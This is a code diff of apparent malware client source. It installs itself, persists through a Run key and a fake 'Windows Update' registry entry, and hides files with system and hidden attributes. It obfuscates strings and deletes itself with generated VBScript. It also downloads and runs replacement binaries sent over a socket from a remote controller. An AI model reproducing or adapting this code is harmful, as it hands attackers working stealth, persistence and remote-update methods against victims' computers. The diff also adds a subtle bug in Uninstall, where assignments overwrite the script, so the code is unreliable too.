@@ -15,6 +15,8 @@ short InstallClient()
 	DirUtils du;
 	EasyMSGB msgb;
 
+	string RemVBS = "";
+
 	sett.InstallSettings();
 
 	string PathToCopy = sett.InstallPath + "\\" + sett.ExeName;
@@ -36,14 +38,19 @@ short InstallClient()
 		if (!du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy))
 			return 3;
 
-		du.WriteFile(du.GetModuleFilePath() + "Rem.vbs", "WScript.Sleep 1500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Rem.vbs\"");
+		RemVBS += "WScript.Sleep 1000\n";
+		RemVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
+		RemVBS += "filesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\n";
+		RemVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Rem.vbs\"";
+
+		du.WriteFile(du.GetModuleFilePath() + "Rem.vbs", RemVBS);
 		su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Rem.vbs\"");
 	}
-	
-	su.RunExe(PathToCopy);
 
 	if (!ru.RegWrite("SOFTWARE\\Windows Update", "Install State", REG_SZ, "true"))
 		return 4;
+
+	su.RunExe(PathToCopy);
 
 	return 0;
 }
@@ -82,28 +89,43 @@ bool UpdateClient(SOCKET Sock)
 	RegUtils ru;
 	COMUNICAZIONI::NewClient NewClient;
 
+	string FMFP = du.GetFullModuleFilePath();
+	string MFP = du.GetModuleFilePath();
+	string MF = du.GetModuleFile();
+	string UpdateVBS = "";
+
 	NewClient = COMUNICAZIONI::UpdateClient(Sock);
 
 	if (NewClient.j.dump() == "null")
 		return false;
 
-	if (!du.CheckDir(du.GetModuleFilePath() + "VXBkYXRl"))
-		du.MakeDir(du.GetModuleFilePath() + "VXBkYXRl");
+	if (!du.CheckDir(MFP + "VXBkYXRl"))
+		du.MakeDir(MFP + "VXBkYXRl");
 
-	if (!du.WriteBinaryFile(du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile(), NewClient.Str))
+	if (!du.WriteBinaryFile(MFP + "VXBkYXRl\\" + MF, NewClient.Str))
 		return false;
 
 	if (NewClient.j["Hidden"])
-		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +h \"") + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
+		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +h \"") + MFP + "VXBkYXRl\\" + MF + "\"");
 	if (NewClient.j["System"])
-		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +s \"") + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
+		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +s \"") + MFP + "VXBkYXRl\\" + MF + "\"");
 
-	if (!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetFullModuleFilePath() + "\"\nWScript.Sleep 1000\nWshShell.Run \"\"\"" + du.GetFullModuleFilePath() + "\"\"\", 1, false\nfilesys.DeleteFolder \"" + du.GetModuleFilePath() + "VXBkYXRl\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
+	UpdateVBS += "WScript.Sleep 5000\n";
+	UpdateVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
+	UpdateVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
+	UpdateVBS += "filesys.DeleteFile \"" + FMFP + "\"\n";
+	UpdateVBS += "filesys.MoveFile \"" + MFP + "VXBkYXRl\\" + MF + "\", \"" + FMFP + "\"\n";
+	UpdateVBS += "WScript.Sleep 1000\n";
+	UpdateVBS += "WshShell.Run \"\"\"" + FMFP + "\"\"\", 1, false\n";
+	UpdateVBS += "filesys.DeleteFolder \"" + MFP + "VXBkYXRl\"\n";
+	UpdateVBS += "filesys.DeleteFile \"" + MFP + "Update.vbs\"";
+
+	if (!du.WriteFile(MFP + "Update.vbs", UpdateVBS))
 		return false;
 
 	ru.RegDelKey("SOFTWARE\\Windows Update");
 
-	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");
+	su.NoOutputCMD("start \"\" \"" + MFP + "Update.vbs\"");
 
 	return true;
 }
@@ -114,10 +136,17 @@ void Uninstall()
 	DirUtils du;
 	SystemUtils su;
 
+	string RemoveVBS = "";
+
 	ru.RegDelKey("SOFTWARE\\Windows Update");
 	ru.RegDelValue(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");
 
-	du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Remove.vbs\"");
+	RemoveVBS = "WScript.Sleep 5000\n";
+	RemoveVBS = "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
+	RemoveVBS = "filesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\n";
+	RemoveVBS = "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Remove.vbs\"";
+
+	du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", RemoveVBS);
 	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Remove.vbs\"");
 }
 
